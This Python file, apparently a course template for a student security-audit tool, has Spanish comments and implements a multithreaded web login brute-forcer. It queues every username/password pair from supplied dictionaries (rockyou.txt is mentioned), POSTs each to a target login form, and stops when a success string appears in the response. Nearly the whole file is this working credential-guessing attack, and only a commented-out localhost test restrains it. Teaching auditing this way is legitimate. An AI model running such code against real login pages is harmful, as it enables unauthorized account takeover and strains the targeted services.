# Módulo a desarrollar por el Grupo 4 (Fase II: Fuerza Bruta Web)
import requests
import threading
import queue
import logging
import datetime

class WebBruteForcer:
    def __init__(self, target_url, login_data_template, success_indicator, max_threads=5):
        self.target_url = target_url
        self.login_data_template = login_data_template # Dict con la estructura POST (ej. {'user':'', 'pass':''})
        self.success_indicator = success_indicator # Texto a buscar en el HTML que indique que entramos
        self.max_threads = max_threads
        self.queue = queue.Queue()
        self.found_credentials = []
        self.stop_event = threading.Event()
        self.lock = threading.Lock()

    def _worker(self):
        """Hilo de trabajo que envía peticiones HTTP POST con combinaciones de credenciales."""
        while not self.queue.empty() and not self.stop_event.is_set():
            try:
                user, password = self.queue.get(timeout=1)
                
                payload = self.login_data_template.copy()
                keys = list(payload.keys())
                # Asignamos dinámicamente el usuario y contraseña a las dos primeras llaves del formulario
                if len(keys) >= 2:
                    payload[keys[0]] = user
                    payload[keys[1]] = password
                
                response = requests.post(self.target_url, data=payload, timeout=5)
                
                if self.success_indicator in response.text:
                    with self.lock:
                        if not self.stop_event.is_set():
                            self.found_credentials.append({'user': user, 'password': password})
                            print(f"\n[+] ¡ÉXITO WEB! Credenciales encontradas -> {user}:{password}")
                            self.stop_event.set()
                            
            except queue.Empty:
                break
            except requests.exceptions.RequestException as e:
                logging.debug(f"Error de red hacia {self.target_url}: {e}")
            finally:
                self.queue.task_done()

    # NOTA SOBRE LOS DICCIONARIOS:
    # ¿De dónde provienen users_list y passwords_list?
    # 1. Durante el desarrollo/pruebas (Grupo 4), pueden definirse estáticamente o leerse de un archivo .txt local de prueba.
    # 2. En la integración final (Semana 7), el orquestador principal (auditoria.py / que también es del Grupo 4) 
    #    será el responsable de cargar los archivos de diccionarios reales (ej. rockyou.txt) indicados por el usuario y pasar estas listas como parámetros.
    def load_dictionaries(self, users_list, passwords_list):
        """Llena la cola con todas las combinaciones posibles de usuario/contraseña."""
        for u in users_list:
            for p in passwords_list:
                self.queue.put((u, p))

    def run(self):
        """Inicia el pool de hilos y orquesta el ataque."""
        print(f"[*] Iniciando ataque de diccionario Web en {self.target_url}...")
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
            
        status_final = "success" if self.found_credentials else "failed"
        error_msg = None if self.found_credentials else "Ataque terminado. No se encontraron credenciales."
            
        return {
            "modulo": "Fuerza Bruta Web",
            "grupo": 4,
            "estudiante": "Profesor (Por falta de entrega)", 
            "target": self.target_url,
            "timestamp": datetime.datetime.now().isoformat(),
            "status": status_final,
            "data": {
                "credenciales_encontradas": self.found_credentials
            },
            "error_message": error_msg
        }

if __name__ == "__main__":
    # Área de pruebas independiente para el Grupo 4
    print("Módulo de Fuerza Bruta Web (Plantilla Base).")
    # inst = WebBruteForcer("http://127.0.0.1/login.php", {}, "Bienvenido,")
    # inst.load_dictionaries(["admin"], ["12345", "password"])
    # resultados = inst.run()
    # import json
    # print(json.dumps(resultados, indent=4))